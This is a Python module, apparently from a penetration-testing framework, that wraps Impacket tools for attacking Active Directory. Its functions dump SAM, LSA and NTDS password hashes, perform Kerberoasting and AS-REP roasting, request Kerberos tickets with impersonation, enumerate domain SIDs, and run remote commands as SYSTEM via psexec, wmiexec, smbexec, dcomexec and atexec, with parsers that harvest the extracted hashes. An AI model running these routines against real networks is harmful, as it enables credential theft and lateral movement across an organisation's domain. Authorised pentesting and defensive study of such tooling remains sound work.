"""
Impacket Module
===============
Intégration des outils Impacket pour le pentest Active Directory
"""

from typing import Dict, Any, List, Optional
from datetime import datetime
from core.executor import CommandExecutor, escape_shell_arg
import json
import re
import shlex


class ImpacketModule:
    """
    Module pour les outils Impacket
    - secretsdump: Dump des hashes (SAM, LSA, NTDS)
    - GetUserSPNs: Kerberoasting
    - GetNPUsers: AS-REP Roasting
    - psexec/smbexec/wmiexec: Exécution distante
    - ntlmrelayx: NTLM Relay
    - et plus...
    """
    
    def __init__(self):
        self.executor = CommandExecutor()

    async def _run_cmd(self, cmd: str, timeout: int):
        """Exécute une commande via argv (sans shell)."""
        return await self.executor.run_args(shlex.split(cmd), timeout=timeout)
    
    def _build_auth(self, options: Dict[str, Any]) -> str:
        """Construit la chaîne d'authentification Impacket format DOMAIN/user:password@target"""
        domain = options.get("domain", "")
        username = options.get("username", "")
        password = options.get("password", "")
        hashes = options.get("hashes", "")  # LM:NT format
        
        auth = ""
        if domain:
            auth = f"{domain}/"
        if username:
            auth += username
        if password:
            auth += f":{password}"
        elif hashes:
            auth += f" -hashes {hashes}"
        
        return auth
    
    async def secretsdump(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Dump des secrets avec secretsdump.py
        Extrait: SAM, LSA secrets, NTDS.dit (DC), cached creds
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        # Options
        extra = ""
        if options.get("just_dc", False):
            extra += " -just-dc"
        if options.get("just_dc_ntlm", False):
            extra += " -just-dc-ntlm"
        if options.get("just_dc_user"):
            extra += f" -just-dc-user {escape_shell_arg(options['just_dc_user'])}"
        if options.get("outputfile"):
            extra += f" -outputfile {escape_shell_arg(options['outputfile'])}"
        
        cmd = f"impacket-secretsdump {auth}@{target_safe} {extra}"
        
        result = await self._run_cmd(cmd, timeout=600)
        
        # Parser les hashes
        parsed = self._parse_secretsdump(result.stdout)
        
        return {
            "action": "secretsdump",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": parsed
        }
    
    async def getuserspns(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Kerberoasting avec GetUserSPNs.py
        Récupère les tickets TGS pour les comptes avec SPN
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        output_file = options.get("outputfile", f"/tmp/kerberoast_{int(datetime.now().timestamp())}.txt")
        
        extra = f"-outputfile {output_file}"
        if options.get("request", True):
            extra += " -request"
        if options.get("dc_ip"):
            extra += f" -dc-ip {escape_shell_arg(options['dc_ip'])}"
        
        cmd = f"impacket-GetUserSPNs {auth}@{target_safe} {extra}"
        
        result = await self._run_cmd(cmd, timeout=300)
        
        # Lire les hashes
        hashes = []
        try:
            with open(output_file, 'r') as f:
                hashes = [line.strip() for line in f if line.strip() and '$krb5tgs$' in line]
        except:
            pass
        
        return {
            "action": "kerberoasting",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "spn_accounts": self._parse_spn_accounts(result.stdout),
                "hashes": hashes,
                "hash_count": len(hashes),
                "output_file": output_file
            }
        }
    
    async def getnpusers(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        AS-REP Roasting avec GetNPUsers.py
        Cible les comptes avec 'Do not require Kerberos preauthentication'
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        
        output_file = options.get("outputfile", f"/tmp/asreproast_{int(datetime.now().timestamp())}.txt")
        
        # Mode sans auth ou avec auth
        if options.get("username"):
            auth = self._build_auth(options)
            cmd = f"impacket-GetNPUsers {auth}@{target_safe}"
        else:
            # Sans auth, besoin d'une liste d'utilisateurs
            userfile = options.get("usersfile", "")
            if userfile:
                cmd = f"impacket-GetNPUsers {target_safe}/ -usersfile {escape_shell_arg(userfile)} -format hashcat -outputfile {output_file}"
            else:
                cmd = f"impacket-GetNPUsers {target_safe}/ -format hashcat -outputfile {output_file}"
        
        if options.get("dc_ip"):
            cmd += f" -dc-ip {escape_shell_arg(options['dc_ip'])}"
        
        result = await self._run_cmd(cmd, timeout=300)
        
        # Lire les hashes AS-REP
        hashes = []
        try:
            with open(output_file, 'r') as f:
                hashes = [line.strip() for line in f if line.strip() and '$krb5asrep$' in line]
        except:
            pass
        
        return {
            "action": "asreproasting",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "vulnerable_users": self._parse_asrep_users(result.stdout),
                "hashes": hashes,
                "hash_count": len(hashes),
                "output_file": output_file
            }
        }
    
    async def psexec(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécution de commande via PsExec (SMB)
        Obtient un shell SYSTEM
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        command = options.get("command", "whoami")
        
        if command == "shell":
            # Mode interactif non-shell: test d'accès non interactif
            cmd = f"impacket-psexec {auth}@{target_safe} 'whoami'"
        else:
            cmd = f"impacket-psexec {auth}@{target_safe} '{escape_shell_arg(command)}'"

        result = await self._run_cmd(cmd, timeout=120)
        
        return {
            "action": "psexec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command,
                "shell_access": "NT AUTHORITY\\SYSTEM" in result.stdout or "C:\\Windows" in result.stdout
            }
        }
    
    async def wmiexec(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécution de commande via WMI
        Plus discret que PsExec
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        command = options.get("command", "whoami")
        
        cmd = f"impacket-wmiexec {auth}@{target_safe} '{escape_shell_arg(command)}'"
        
        result = await self._run_cmd(cmd, timeout=120)
        
        return {
            "action": "wmiexec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command
            }
        }
    
    async def smbexec(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécution de commande via SMB
        Alternative à PsExec
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        command = options.get("command", "whoami")
        
        cmd = f"impacket-smbexec {auth}@{target_safe} '{escape_shell_arg(command)}'"
        
        result = await self._run_cmd(cmd, timeout=120)
        
        return {
            "action": "smbexec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command
            }
        }
    
    async def dcomexec(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécution de commande via DCOM
        Utilise MMC20.Application par défaut
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        command = options.get("command", "whoami")
        object_type = options.get("object", "MMC20")  # MMC20, ShellWindows, ShellBrowserWindow
        
        cmd = f"impacket-dcomexec -object {object_type} {auth}@{target_safe} '{escape_shell_arg(command)}'"
        
        result = await self._run_cmd(cmd, timeout=120)
        
        return {
            "action": "dcomexec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command,
                "object_used": object_type
            }
        }
    
    async def atexec(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécution de commande via Task Scheduler
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        command = options.get("command", "whoami")
        
        cmd = f"impacket-atexec {auth}@{target_safe} '{escape_shell_arg(command)}'"
        
        result = await self._run_cmd(cmd, timeout=120)
        
        return {
            "action": "atexec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command
            }
        }
    
    async def smbclient(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Client SMB interactif avec Impacket
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        share = options.get("share", "")
        command = options.get("command", "shares")  # shares, ls, get, put
        
        if share:
            cmd = f"impacket-smbclient {auth}@{target_safe}/{share}"
        else:
            cmd = f"impacket-smbclient {auth}@{target_safe}"
        
        result = await self._run_cmd(cmd, timeout=60)
        
        return {
            "action": "impacket_smbclient",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "shares": self._parse_shares(result.stdout) if command == "shares" else []
            }
        }
    
    async def lookupsid(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Énumération des SID avec lookupsid.py
        Permet de découvrir les utilisateurs et groupes du domaine
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        max_rid = options.get("max_rid", 4000)
        
        cmd = f"impacket-lookupsid {auth}@{target_safe} {max_rid}"
        
        result = await self._run_cmd(cmd, timeout=300)
        
        # Parser les SIDs
        users, groups = self._parse_lookupsid(result.stdout)
        
        return {
            "action": "lookupsid",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "users": users,
                "groups": groups,
                "user_count": len(users),
                "group_count": len(groups)
            }
        }
    
    async def gettgt(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Demande un TGT avec getTGT.py
        Utile pour vérifier des credentials ou obtenir un ticket
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        cmd = f"impacket-getTGT {auth}"
        
        if options.get("dc_ip"):
            cmd += f" -dc-ip {escape_shell_arg(options['dc_ip'])}"
        
        result = await self._run_cmd(cmd, timeout=60)
        
        # Chercher le fichier .ccache généré
        ccache_file = None
        for line in result.stdout.split('\n'):
            if '.ccache' in line:
                match = re.search(r'(\S+\.ccache)', line)
                if match:
                    ccache_file = match.group(1)
        
        return {
            "action": "getTGT",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "tgt_obtained": ccache_file is not None,
                "ccache_file": ccache_file
            }
        }
    
    async def getst(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Demande un Service Ticket avec getST.py
        Utile pour Silver Ticket ou accès à un service spécifique
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        auth = self._build_auth(options)
        
        spn = options.get("spn", "")  # Ex: cifs/dc.domain.local
        impersonate = options.get("impersonate", "")  # Utilisateur à impersonate
        
        cmd = f"impacket-getST {auth}"
        
        if spn:
            cmd += f" -spn {escape_shell_arg(spn)}"
        if impersonate:
            cmd += f" -impersonate {escape_shell_arg(impersonate)}"
        if options.get("dc_ip"):
            cmd += f" -dc-ip {escape_shell_arg(options['dc_ip'])}"
        
        result = await self._run_cmd(cmd, timeout=60)
        
        return {
            "action": "getST",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(options.get("password", ""), "****") if options.get("password") else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "spn": spn,
                "impersonated_user": impersonate
            }
        }
    
    # =========================================================================
    # Parsers
    # =========================================================================
    
    def _parse_secretsdump(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de secretsdump"""
        parsed = {
            "sam_hashes": [],
            "lsa_secrets": [],
            "ntds_hashes": [],
            "cached_creds": []
        }
        
        section = None
        for line in output.split('\n'):
            line = line.strip()
            
            if '[*] Dumping local SAM hashes' in line:
                section = 'sam'
            elif '[*] Dumping LSA Secrets' in line:
                section = 'lsa'
            elif '[*] Dumping Domain Credentials' in line:
                section = 'ntds'
            elif '[*] Dumping cached domain logon' in line:
                section = 'cached'
            elif line and ':' in line and section:
                if section == 'sam' and ':::' in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        parsed["sam_hashes"].append({
                            "username": parts[0],
                            "rid": parts[1],
                            "lm_hash": parts[2],
                            "nt_hash": parts[3].rstrip(':')
                        })
                elif section == 'ntds' and ':::' in line:
                    parts = line.split(':')
                    if len(parts) >= 4:
                        parsed["ntds_hashes"].append({
                            "username": parts[0],
                            "rid": parts[1],
                            "lm_hash": parts[2],
                            "nt_hash": parts[3].rstrip(':')
                        })
                elif section == 'lsa':
                    parsed["lsa_secrets"].append(line)
                elif section == 'cached':
                    parsed["cached_creds"].append(line)
        
        return parsed
    
    def _parse_spn_accounts(self, output: str) -> List[Dict[str, str]]:
        """Parse les comptes SPN de GetUserSPNs"""
        accounts = []
        for line in output.split('\n'):
            if '@' in line and '/' in line:
                # Format: ServicePrincipalName  Name  MemberOf  ...
                parts = line.split()
                if len(parts) >= 2:
                    accounts.append({
                        "spn": parts[0],
                        "name": parts[1] if len(parts) > 1 else ""
                    })
        return accounts
    
    def _parse_asrep_users(self, output: str) -> List[str]:
        """Parse les utilisateurs vulnérables AS-REP"""
        users = []
        for line in output.split('\n'):
            if 'does not require Kerberos preauthentication' in line.lower():
                match = re.search(r'(\S+)\s+does not require', line, re.I)
                if match:
                    users.append(match.group(1))
        return users
    
    def _parse_shares(self, output: str) -> List[Dict[str, str]]:
        """Parse les partages SMB"""
        shares = []
        for line in output.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split()
                if len(parts) >= 1:
                    shares.append({
                        "name": parts[0],
                        "type": parts[1] if len(parts) > 1 else "",
                        "comment": ' '.join(parts[2:]) if len(parts) > 2 else ""
                    })
        return shares
    
    def _parse_lookupsid(self, output: str) -> tuple:
        """Parse la sortie de lookupsid"""
        users = []
        groups = []
        
        for line in output.split('\n'):
            if '(SidTypeUser)' in line:
                match = re.search(r'(\S+\\)?(\S+)\s+\(SidTypeUser\)', line)
                if match:
                    users.append(match.group(2))
            elif '(SidTypeGroup)' in line:
                match = re.search(r'(\S+\\)?(\S+)\s+\(SidTypeGroup\)', line)
                if match:
                    groups.append(match.group(2))
        
        return users, groups
